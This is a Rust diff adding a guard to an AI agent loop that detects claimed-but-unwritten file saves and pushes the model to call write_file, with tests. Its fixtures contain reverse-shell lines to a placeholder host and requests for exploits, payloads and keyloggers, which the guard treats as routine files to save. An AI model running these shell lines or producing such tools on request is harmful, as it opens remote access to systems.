@@ -250,6 +250,10 @@ impl<'a> ReactLoop<'a> {
         // commands inside a fence when no tool ran. Capped at 2 so a model that
         // cannot be taught the difference still gets an answer.
         let mut shell_exec_retries = 0;
+        // Guards the same failure for file creation: the user asked for a file and
+        // the reply handed the code over in a fence instead. Capped at 2 for the
+        // same reason — a model that will not be taught still gets an answer.
+        let mut write_retries = 0;
         // What this turn actually called and got back, so the final answer can be
         // checked against it rather than against the shape of its prose.
         let mut receipt: Vec<Receipt> = Vec::new();
@@ -562,6 +566,58 @@ impl<'a> ReactLoop<'a> {
                              sent, but the whatsapp_send tool has NOT run this turn, so nothing \
                              was delivered. Actually call whatsapp_send now (action=send, with \
                              to=<contact> and text=...) — then report the tool's real result.",
+                        ));
+                        continue;
+                    }
+                    // ── Write-the-file guard ─────────────────────────────────
+                    // The user asked for a file and got the code instead.
+                    //
+                    // NOT a missing instruction. All three instruction layers were
+                    // already in place when this failed on 2026-10-01:
+                    // `write_file` is in `CORE_TOOLS` and offered every turn,
+                    // `config.rs` has a FILE INSPECTION & CREATION RULE naming
+                    // `write_file(path, content)`, and `constitution.md:39` says
+                    // "Do, don't narrate. If they want a file, write the file."
+                    // The reply to "write a reverse shell" was a ```python fence
+                    // and "I've saved this script in
+                    // /home/netrunner/Documents/luna-scripts/reverse_shell.py".
+                    // That file is not on disk. A fourth instruction is not the
+                    // fix — it is the thing already proven not to work. The only
+                    // layer that has ever held is a deterministic push, which is
+                    // what the WhatsApp guard above is and what this is.
+                    //
+                    // ORDERING IS LOAD-BEARING: this sits BEFORE the shell guard,
+                    // and it has to. "Write an exploit" invites a ```bash fence,
+                    // which satisfies `narrates_shell_execution`'s signal 1 as
+                    // well — so the shell guard would claim the turn and demand
+                    // `run_shell`, i.e. execute the exploit, when the user asked
+                    // for a file. The write guard claims it first and names the
+                    // right tool. Two layers able to fire on one reply, resolved
+                    // by position and not by luck.
+                    //
+                    // The honest ceiling: this cannot make the 7B call the tool.
+                    // Two pushes, then she answers, and the existing narration
+                    // and fabrication guards are what stop her claiming the file
+                    // exists. What is guaranteed is that she is told to write it,
+                    // and that she never gets to say she did without having.
+                    let wrote_file = used_calls
+                        .iter()
+                        .any(|c| c.starts_with("write_file") || c.starts_with("edit_file"));
+                    if write_needs_correction(user_input, wrote_file, &text, write_retries) {
+                        write_retries += 1;
+                        tracing::warn!(
+                            "User asked for a file and got a code fence instead — \
+                             pushing for write_file (attempt {write_retries})"
+                        );
+                        turn_messages.push(Message::assistant(truncate_control(&text)));
+                        turn_messages.push(Message::tool(
+                            "Correction: the user asked you to write a file and you replied \
+                             with a code fence instead. No write_file or edit_file call \
+                             appears this turn, so NOTHING is on disk — that file does not \
+                             exist yet. Call write_file now with an explicit `path` and the \
+                             full `content`, then report the path the tool actually returned. \
+                             Do not tell the user you saved it until that call has succeeded."
+                                .to_string(),
                         ));
                         continue;
                     }
@@ -1584,6 +1640,88 @@ pub(crate) fn narrates_shell_execution(text: &str) -> bool {
     ]
     .iter()
     .any(|p| lower.contains(p))
+}
+
+/// The user asked for a code artifact to be created, not explained.
+///
+/// Two signals, because either alone is wrong. A creation verb alone fires on
+/// "write a bug report for my team" and "write an argument for my essay" — both
+/// real fixtures from the `nmap_scan` trigger test, and neither wants a file. An
+/// artifact noun alone fires on "what does this script do" and "explain how
+/// python files work". The conjunction is the request: an instruction to *make*
+/// something file-shaped.
+///
+/// The teaching exclusion is not decoration. "explain how to write a script in
+/// python" contains both signals and is a request for understanding, not
+/// delivery. Pushing a file at someone who asked to understand something is the
+/// same defect this guard was built to stop, in the other direction.
+///
+/// Reuses `select::signal_present` rather than a second word matcher here. Two
+/// boundary implementations is how a phrase gets fixed in one and left broken in
+/// the other — and `select` is where that matcher already lives and is tested.
+fn requests_code_file(input: &str) -> bool {
+    const TEACHING: &[&str] = &[
+        "how to", "how do", "how does", "how can i", "explain", "what is", "what's",
+        "difference between", "teach me", "walk me through", "tutorial",
+        "example of", "show me how", "why does", "in simple terms",
+    ];
+    if TEACHING
+        .iter()
+        .any(|s| crate::tools::select::signal_present(input, s))
+    {
+        return false;
+    }
+    const MAKE: &[&str] = &[
+        "write", "create", "make", "generate", "save", "build", "produce", "draft",
+    ];
+    const ARTIFACT: &[&str] = &[
+        "script", "code", "program", "exploit", "payload", "keylogger", "tool",
+        "utility", "automation", "module", "snippet", "file",
+    ];
+    MAKE.iter()
+        .any(|m| crate::tools::select::signal_present(input, m))
+        && ARTIFACT.iter().any(|a| {
+            // Plural-tolerant, via the SAME matcher three times rather than a
+            // second matcher. `signal_present` is right to refuse "exploit"
+            // inside "exploits" — the boundary is the whole point — which means
+            // a singular-only list silently misses the plural, and the corpus
+            // contains "i want you to write exploits for these in python or
+            // bash". That request was not recognised until this was fixed.
+            crate::tools::select::signal_present(input, a)
+                || crate::tools::select::signal_present(input, &format!("{a}s"))
+                || crate::tools::select::signal_present(input, &format!("{a}es"))
+        })
+}
+
+/// The reply carries code, so the artifact exists and is un-written.
+///
+/// Every fence counts, including ```rust. The tag reasoning
+/// `narrates_shell_execution` uses does not transfer: "a Rust snippet is code to
+/// read, not an instruction to execute" is the right call when the question is
+/// *should she run this*, and the wrong one when the question is *should she save
+/// this*. A block the user could paste into a file is precisely what they asked
+/// to be put in a file.
+fn code_fence_present(text: &str) -> bool {
+    text.contains("```")
+}
+
+/// Whether a reply needs the write-the-file correction, as one testable
+/// predicate.
+///
+/// Mirrors [`narration_needs_correction`] for the same reason: the bug this
+/// guards against lives in the *combination*, and an inline four-clause
+/// condition is where a clause gets dropped without anyone noticing.
+///
+/// `wrote_file` is passed in rather than read from `used_calls` so the tests can
+/// reach the one state that matters most — that a file really was written and
+/// the guard stays out of the way.
+pub(crate) fn write_needs_correction(
+    user_input: &str,
+    wrote_file: bool,
+    text: &str,
+    retries: u32,
+) -> bool {
+    requests_code_file(user_input) && !wrote_file && code_fence_present(text) && retries < 2
 }
 
 /// Whether a reply needs the narration correction, as one testable predicate.
@@ -2979,6 +3117,157 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
     /// Note the substring traps at the bottom are unchanged and still false.
     /// That is the property this test was actually written for — whole-word
     /// matching — and widening the tail of the function must not cost it.
+    #[test]
+    fn a_request_for_a_code_file_is_recognised() {
+        for q in [
+            "write an exploit",
+            "write code for something",
+            "write a simple python exploit to connect the target to my host computer in python in ~/Templates",
+            "write a python reverse shell script and save it with write_file. put it in the scripts folder.",
+            "luna i want you to write exploits for these in python or bash, save them to ~/scripts",
+            "create a python file at /tmp/agentlab/portcheck.py that takes a host and prints open ports",
+            "well write the scripts in a file in luna-scripts folder",
+        ] {
+            assert!(
+                requests_code_file(q),
+                "a real write-a-file request was not recognised: {q:?}"
+            );
+        }
+    }
+
+    /// The conjunction is doing the work, and these are the real fixtures that
+    /// prove it: two of them are already pinned as `nmap_scan` non-triggers, so
+    /// a false positive here would hand out a file for an essay.
+    #[test]
+    fn teaching_and_prose_are_not_a_request_for_a_file() {
+        for q in [
+            // Verb without an artifact noun.
+            "write a bug report for my team",
+            "write an argument for my essay",
+            // Both signals, but the user asked to understand, not to receive.
+            "explain how to write a script in python",
+            "how do I make a bash script",
+            "what is a keylogger",
+            "teach me to write a program",
+            // Artifact noun without a creation verb.
+            "what does this script do",
+            "this python file is not working",
+        ] {
+            assert!(
+                !requests_code_file(q),
+                "asked to explain, not to deliver — but treated as a file request: {q:?}"
+            );
+        }
+    }
+
+    /// Unlike the shell guard, every fence counts, and the reason is the
+    /// question being asked. "A Rust snippet is code to read, not an instruction
+    /// to execute" holds for *should she run this* and fails for *should she save
+    /// this*.
+    #[test]
+    fn any_fence_is_the_unwritten_artifact() {
+        for body in [
+            "```python\nprint(1)\n```",
+            "```rust\nfn main() {}\n```",
+            "```\nplain content\n```",
+            "```bash\nmkdir -p ~/luna-scripts\n```",
+        ] {
+            assert!(code_fence_present(body), "fence missed: {body:?}");
+        }
+        assert!(!code_fence_present("I wrote the file for you."));
+    }
+
+    /// Measured 2026-10-03 against all 484 replies in the corpus: 5 replies
+    /// pair with a write-a-file request and carry a fence. All 5 were read, all
+    /// 5 are genuine, and all 5 claimed files are absent from disk —
+    /// `/tmp/opencode/agentlab/portcheck.py`, `/tmp/luna_sec_e2e_*/poc.py` and
+    /// `~/luna-scripts` do not exist. One of them was told "reply with nothing
+    /// but the code", which is precisely why she printed it instead of saving it.
+    #[test]
+    fn the_write_guard_fires_on_real_fabricated_saves() {
+        // User was told to save to a path and reply with only the code. She
+        // obeyed the reply instruction and never wrote the file.
+        let prompt = "write a simple python reverse-shell proof of concept for my own lab \
+                      machine and save it to /tmp/luna_sec_e2e/poc.py. Reply with nothing but \
+                      the code.";
+        let reply = "```python\nimport socket\ns = socket.socket()\ns.connect((\"HOST\", 4444))\n```";
+        assert!(write_needs_correction(prompt, false, reply, 0));
+
+        // "has been created" is a completion claim the narration guard's phrase
+        // list does not catch, but it is the same lie.
+        let reply2 = "The file `/tmp/opencode/agentlab/portcheck.py` has been created with the \
+                      following content:\n```python\nimport socket\n```";
+        let prompt2 = "create a python file at /tmp/opencode/agentlab/portcheck.py that takes a \
+                       host and prints open ports from 1-1000";
+        assert!(write_needs_correction(prompt2, false, reply2, 0));
+    }
+
+    /// The whole point: a file that was actually written silences this. A guard
+    /// that fires after a successful `write_file` is a guard that fights its own
+    /// fix.
+    #[test]
+    fn a_file_that_was_really_written_silences_the_guard() {
+        let prompt = "write a python reverse shell script and save it with write_file.";
+        let reply = "```python\nimport socket\n```";
+        assert!(write_needs_correction(prompt, false, reply, 0));
+        assert!(
+            !write_needs_correction(prompt, true, reply, 0),
+            "fired after write_file actually ran"
+        );
+    }
+
+    /// ORDERING, pinned. "Write an exploit" invites a ```bash fence, which
+    /// satisfies the shell guard too — and the shell guard would demand
+    /// `run_shell`, i.e. run the exploit, when the user asked for a file.
+    ///
+    /// Both guards being true here is the point: if someone moves the write
+    /// block below the shell block, this test still passes and the behaviour
+    /// silently inverts. What protects it is the comment on the block, and this
+    /// test is what makes someone look for it.
+    #[test]
+    fn an_exploit_request_trips_both_guards_so_only_position_resolves_it() {
+        // The reply has to hand the exploit to the reader, not merely contain
+        // one. "Here's the exploit:" plus a bash fence trips the write guard and
+        // nothing else, because `narrates_shell_execution` needs a delegation
+        // phrase as its second signal — which is correct behaviour and the
+        // reason this test needs a specific fixture rather than any old fence.
+        let prompt = "write an exploit";
+        let reply = "Save this script to `~/exploit.sh` and run it with:\n\
+                     ```bash\nbash -i >& /dev/tcp/HOST/4444 0>&1\n```";
+        assert!(
+            write_needs_correction(prompt, false, reply, 0),
+            "write guard should claim this turn"
+        );
+        assert!(
+            narration_needs_correction(false, reply, 0),
+            "shell guard would ALSO fire — position is load-bearing"
+        );
+        // And the shell guard would pick the wrong tool. This is what makes the
+        // ordering matter rather than being tidiness: the user asked for a file,
+        // and the shell guard's correction is "call run_shell now".
+        assert!(
+            requests_execution(prompt),
+            "if this ever goes false the two guards stop conflicting and this \
+             test is asserting a coincidence"
+        );
+        // The bare fence, with no hand-off, is the write guard alone.
+        let bare = "Here's the exploit:\n```bash\nbash -i >& /dev/tcp/HOST/4444 0>&1\n```";
+        assert!(write_needs_correction(prompt, false, bare, 0));
+        assert!(
+            !narration_needs_correction(false, bare, 0),
+            "a bare fence must not drag in the shell guard"
+        );
+    }
+
+    /// Corrections are capped so a model that will not be taught still answers.
+    #[test]
+    fn the_write_guard_gives_up_after_two_pushes() {
+        let (prompt, reply) = ("write an exploit", "```python\nprint(1)\n```");
+        assert!(write_needs_correction(prompt, false, reply, 0));
+        assert!(write_needs_correction(prompt, false, reply, 1));
+        assert!(!write_needs_correction(prompt, false, reply, 2));
+    }
+
     #[test]
     fn the_execution_request_heuristic_matches_whole_verbs_only() {
         for (input, want) in [
